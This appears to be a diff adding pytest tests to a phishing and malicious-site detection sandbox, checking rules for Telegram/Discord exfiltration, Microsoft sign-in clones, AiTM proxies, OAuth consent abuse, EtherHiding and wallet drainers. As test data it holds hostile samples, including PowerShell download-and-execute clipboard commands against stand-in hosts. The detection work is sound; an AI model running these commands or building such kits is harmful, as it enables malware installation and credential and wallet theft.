@@ -761,3 +761,239 @@ def test_bip39_wordlist_yara():
     words = b'["abandon","ability","able","about","above", "...", "zero","zone","zoo"]'
     assert _yara("bip39_wordlist_embedded").match(data=words)
     assert not _yara("bip39_wordlist_embedded").match(data=b"abandon ship, above all")
+
+
+# --- helpers for HAR / raw-DOM / result-backed captures -------------------------------
+
+
+def _req(url, method="GET", post="", status=200, req_headers=None, set_cookie=None, body=""):
+    return {
+        "request": {
+            "method": method,
+            "url": url,
+            "headers": [{"name": k, "value": v} for k, v in (req_headers or {}).items()],
+            "postData": {"text": post} if post else {},
+        },
+        "response": {
+            "status": status,
+            "headers": [{"name": "set-cookie", "value": c} for c in (set_cookie or [])],
+            "content": {"text": body},
+        },
+    }
+
+
+def _cap(final_url, pages=(), har=(), dom_html=(), allowlisted=(), **result):
+    data = _data(final_url, pages, **result)
+    data.har_entries = list(har)
+    data.dom_html = list(dom_html)
+    data.allowlisted = set(allowlisted)
+    return data
+
+
+_TG_TOKEN = "123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw"
+
+
+def test_telegram_bot_exfil_fires_and_widget_is_quiet():
+    har = [_req(f"https://api.telegram.org/bot{_TG_TOKEN}/sendMessage", "POST", post="chat_id=1")]
+    assert "telegram_bot_exfil" in _hits(_cap("https://kit.example/", har=har))
+    # Telegram login/share widget: telegram.org (not api.telegram.org), no Bot API path.
+    widget = [_req("https://telegram.org/js/telegram-widget.js")]
+    assert "telegram_bot_exfil" not in _hits(_cap("https://blog.example/", har=widget))
+
+
+def test_discord_webhook_exfil_fires_and_normal_discord_is_quiet():
+    hook = "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwx"
+    har = [_req(hook, "POST")]
+    assert "discord_webhook_exfil" in _hits(_cap("https://kit.example/", har=har))
+    normal = [_req("https://discord.com/app")]
+    assert "discord_webhook_exfil" not in _hits(_cap("https://blog.example/", har=normal))
+
+
+_MS_CLONE_HTML = (
+    '<html><head><title>Sign in to your account</title></head><body>'
+    '<form><input id="i0116" name="loginfmt"><input type="password" id="i0118">'
+    '<input id="idSIButton9" type="submit"></form>'
+    '<script>$Config={"urlGetCredentialType":"/common/GetCredentialType"};</script>'
+    "</body></html>"
+)
+
+
+def test_ms_signin_clone_on_foreign_host_fires():
+    dom = [{"url": "https://portal-login.example/", "html": _MS_CLONE_HTML}]
+    assert "ms_signin_clone_foreign_host" in _hits(_cap("https://portal-login.example/", dom_html=dom))  # noqa: E501
+
+
+def test_ms_signin_button_on_third_party_is_quiet():
+    """A real site with a 'Sign in with Microsoft' button: one marker only, no clone."""
+    html = (
+        '<html><body><a href="https://login.microsoftonline.com/">Sign in with Microsoft</a>'
+        '<form><input type="password"></form></body></html>'
+    )
+    dom = [{"url": "https://app.example/login", "html": html}]
+    assert "ms_signin_clone_foreign_host" not in _hits(_cap("https://app.example/login", dom_html=dom))  # noqa: E501
+
+
+def test_aitm_ms_paths_on_foreign_host_fires_and_real_ms_is_quiet():
+    body = '$Config={"urlGetCredentialType":"x"}; i0116 idSIButton9'
+    evil = [_req("https://evilproxy.example/common/oauth2/v2.0/authorize", body=body)]
+    assert "aitm_ms_paths_foreign_host" in _hits(_cap("https://evilproxy.example/", har=evil))
+    real = [_req("https://login.microsoftonline.com/common/oauth2/v2.0/authorize", body=body)]
+    assert "aitm_ms_paths_foreign_host" not in _hits(_cap("https://login.microsoftonline.com/", har=real))  # noqa: E501
+
+
+def test_idp_cdn_assets_on_foreign_page_fires_and_real_idp_is_quiet():
+    cdn = [_req("https://aadcdn.msftauth.net/shared/1.0/logo.png")]
+    page = _page("https://clone.example/", title="Sign in", text="Microsoft sign in",
+                 forms=[PASSWORD_FORM])  # noqa: E501
+    assert "idp_cdn_assets_foreign_page" in _hits(_cap("https://clone.example/", [page], har=cdn))
+    ms_page = _page("https://login.live.com/", title="Sign in", text="Microsoft",
+                    forms=[PASSWORD_FORM])  # noqa: E501
+    assert "idp_cdn_assets_foreign_page" not in _hits(_cap("https://login.live.com/", [ms_page], har=cdn))  # noqa: E501
+
+
+def test_ms_session_cookie_on_foreign_host_fires_and_real_ms_is_quiet():
+    evil = [_req("https://evilproxy.example/", set_cookie=["ESTSAUTH=abc; Path=/"])]
+    assert "ms_session_cookie_foreign_host" in _hits(_cap("https://evilproxy.example/", har=evil))
+    real = [_req("https://login.microsoftonline.com/", set_cookie=["ESTSAUTH=abc"])]
+    assert "ms_session_cookie_foreign_host" not in _hits(_cap("https://login.microsoftonline.com/", har=real))  # noqa: E501
+
+
+def test_oauth_error_redirect_abuse_fires_and_silent_sso_is_quiet():
+    bounce = [
+        {"from": "https://lure.example/", "to": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?prompt=none&client_id=x", "type": "js"},  # noqa: E501
+        {"from": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize", "to": "https://attacker.example/download/x?error=interaction_required", "type": "js"},  # noqa: E501
+    ]
+    assert "oauth_error_redirect_abuse" in _hits(_cap("https://attacker.example/download/x", redirects=bounce))  # noqa: E501
+    # Silent SSO: the error bounces back to the IdP's own SPA, not a foreign host.
+    sso = [
+        {"from": "https://app.example/", "to": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?prompt=none", "type": "js"},  # noqa: E501
+        {"from": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize", "to": "https://login.microsoftonline.com/error?error=login_required", "type": "js"},  # noqa: E501
+    ]
+    assert "oauth_error_redirect_abuse" not in _hits(_cap("https://app.example/", redirects=sso))
+
+
+def test_illicit_consent_grant_fires_and_first_party_is_quiet():
+    bad = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=11111111-2222-3333-4444-555555555555&scope=offline_access%20Mail.ReadWrite&prompt=consent"  # noqa: E501
+    assert "illicit_consent_grant" in _hits(_cap("https://x.example/", navigations=[{"url": bad}]))
+    fp = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=offline_access%20Mail.ReadWrite&prompt=consent"  # noqa: E501
+    assert "illicit_consent_grant" not in _hits(_cap("https://x.example/", navigations=[{"url": fp}]))  # noqa: E501
+
+
+def _rpc(host="bsc-dataseed.binance.org", to="0x1111111111111111111111111111111111111111"):
+    body = (
+        '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":'
+        '[{"to":"' + to + '","data":"0x6d4ce63c"},"latest"]}'
+    )
+    return [_req(f"https://{host}/", "POST", post=body)]
+
+
+def test_web3_rpc_from_non_wallet_page_fires_and_wallet_app_is_quiet():
+    assert "web3_rpc_from_non_wallet_page" in _hits(_cap("https://compromised.example/", har=_rpc()))  # noqa: E501
+    # A real dApp: the page used the wallet, so it is not EtherHiding.
+    dapp = _cap("https://dapp.example/", har=_rpc(), wallet_requests=[{"method": "eth_requestAccounts"}])  # noqa: E501
+    assert "web3_rpc_from_non_wallet_page" not in _hits(dapp)
+
+
+def test_web3_known_malicious_contract_fires():
+    har = _rpc(to="0x8eac3198dd72f3e07108c4c7cff43108ad48a71c")
+    assert "web3_known_malicious_contract" in _hits(_cap("https://x.example/", har=har))
+    assert "web3_known_malicious_contract" not in _hits(_cap("https://x.example/", har=_rpc()))
+
+
+def _clipcap(url, clip_text, pages=()):
+    clip = [{"page": "p0", "api": "navigator.clipboard.writeText", "text": clip_text}]
+    return _cap(url, pages, clipboard=clip)
+
+
+def test_fake_captcha_clipboard_command_fires_and_real_captcha_is_quiet():
+    page = _page("https://verify.example/", title="Verify you are human",
+                 text="Verification ID 4821. I am not a robot.")  # noqa: E501
+    assert "fake_captcha_clipboard_command" in _hits(_clipcap("https://verify.example/", "cmd /c start calc", [page]))  # noqa: E501
+    # Real reCAPTCHA page with no clipboard command.
+    real = _page("https://signup.example/", title="Sign up", text="reCAPTCHA verification")
+    assert "fake_captcha_clipboard_command" not in _hits(_cap("https://signup.example/", [real]))
+
+
+def test_filefix_command_disguised_as_path_fires_and_plain_command_is_quiet():
+    filefix = "powershell -NoP -W Hidden -c \"iwr x.example|iex\"            # C:\\\\Users\\\\Public\\\\HRPolicy.docx"  # noqa: E501
+    assert "filefix_command_disguised_as_path" in _hits(_clipcap("https://share.example/", filefix))  # noqa: E501
+    assert "filefix_command_disguised_as_path" not in _hits(_clipcap("https://docs.example/", "cmd /c dir C:\\Users"))  # noqa: E501
+
+
+def test_fake_browser_update_fires_and_browser_update_org_is_quiet():
+    page = _page("https://news-blog.example/", title="News",
+                 text="Your browser is out of date. Update Chrome to continue.")  # noqa: E501
+    data = _cap("https://news-blog.example/", [page],
+                downloads=[{"sha256": "aa", "suggested_filename": "ChromeSetup.exe"}])  # noqa: E501
+    data.download_heads = {"aa": b"MZ\x90\x00"}
+    assert "fake_browser_update" in _hits(data)
+    # browser-update.org banner that only links to the vendor (vendor host, no download here).
+    ok = _page("https://browser-update.org/", title="Update", text="Your browser is out of date")
+    assert "fake_browser_update" not in _hits(_cap("https://browser-update.org/", [ok]))
+
+
+def test_smuggled_credential_page_fires_and_https_page_is_quiet():
+    blob = _page("blob:https://host.example/uuid", forms=[PASSWORD_FORM])
+    assert "smuggled_credential_page" in _hits(_cap("https://host.example/", [blob]))
+    normal = _page("https://host.example/login", forms=[PASSWORD_FORM])
+    assert "smuggled_credential_page" not in _hits(_cap("https://host.example/login", [normal]))
+
+
+def test_ipfs_credential_page_fires_and_nft_metadata_is_quiet():
+    cid = "bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efuylqabf3oclgtqy55fbzdi"
+    url = f"https://{cid}.ipfs.dweb.link/"
+    page = _page(url, title="Sign in", forms=[PASSWORD_FORM])
+    assert "ipfs_credential_page" in _hits(_cap(url, [page]))
+    meta = _page(url, title="NFT", text="token metadata")
+    assert "ipfs_credential_page" not in _hits(_cap(url, [meta]))
+
+
+def test_client_side_ip_lookup_fires_with_context_and_is_quiet_alone():
+    har = [_req("https://ip-api.com/json")]
+    with_cmd = _cap("https://lure.example/", har=har,
+                    clipboard=[{"page": "p0", "api": "x", "text": "powershell -enc " + "A" * 60}])  # noqa: E501
+    assert "client_side_ip_geo_lookup" in _hits(with_cmd)
+    assert "client_side_ip_geo_lookup" not in _hits(_cap("https://store.example/", har=har))
+
+
+def test_credential_relay_websocket_fires_and_bare_socket_is_quiet():
+    frames = [{"url": "wss://relay.example/socket.io/", "direction": "sent", "event": "recieveid"}]
+    brand = _page("https://m365-clone.example/", title="Sign in to your account",
+                  text="Microsoft", forms=[PASSWORD_FORM])  # noqa: E501
+    assert "credential_relay_websocket" in _hits(_cap("https://m365-clone.example/", [brand], websocket_frames=frames))  # noqa: E501
+    plain = _page("https://chat.example/", title="Chat", text="support")
+    assert "credential_relay_websocket" not in _hits(_cap("https://chat.example/", [plain], websocket_frames=frames))  # noqa: E501
+
+
+def test_devtools_blocking_fires_with_context_and_is_quiet_alone():
+    blocked = [{"kind": "devtools_key", "key": "F12"}, {"kind": "contextmenu"}]
+    clip = [{"page": "p0", "api": "x", "text": "powershell -w hidden -c \"irm x|iex\""}]
+    assert "devtools_blocking" in _hits(_cap("https://kit.example/", clipboard=clip, blocked_input=blocked))  # noqa: E501
+    assert "devtools_blocking" not in _hits(_cap("https://gallery.example/", blocked_input=blocked))
+
+
+def test_wallet_drainer_signature_fires_and_dex_approval_is_quiet():
+    drain = [{"method": "eth_signTypedData_v4", "primaryType": "PermitBatch"}]
+    assert "wallet_drainer_signature" in _hits(_cap("https://claim-airdrop.example/", wallet_requests=drain))  # noqa: E501
+    # A real DEX on an allowlisted domain: a Permit on Uniswap is expected.
+    ok = _cap("https://app.uniswap.org/", wallet_requests=drain, allowlisted=["uniswap.org"])
+    assert "wallet_drainer_signature" not in _hits(ok)
+
+
+def test_tycoon2fa_web_yara():
+    kit = b'socket.on("recieveid",f);function tryfindingele(){};var x=".btn-blue-next-btn"'
+    assert _yara("tycoon2fa_web").match(data=kit)
+    assert not _yara("tycoon2fa_web").match(data=b'<form><input type=password></form>')
+
+
+def test_crypto_decrypt_then_write_yara():
+    page = b'var t=CryptoJS.AES.decrypt(d,k).toString();document.write("' + b"QUJD" * 300 + b'")'
+    assert _yara("crypto_decrypt_then_write").match(data=page)
+    assert not _yara("crypto_decrypt_then_write").match(data=b"CryptoJS.AES.decrypt(x,k)")
+
+
+def test_extra_free_hosting_platforms_are_tenanted():
+    from sandbox.analysis.domains import free_hosting, site
+
+    assert free_hosting("kit.storage.dev") == "storage.dev"
+    assert site("kit.storage.dev") == "kit.storage.dev"
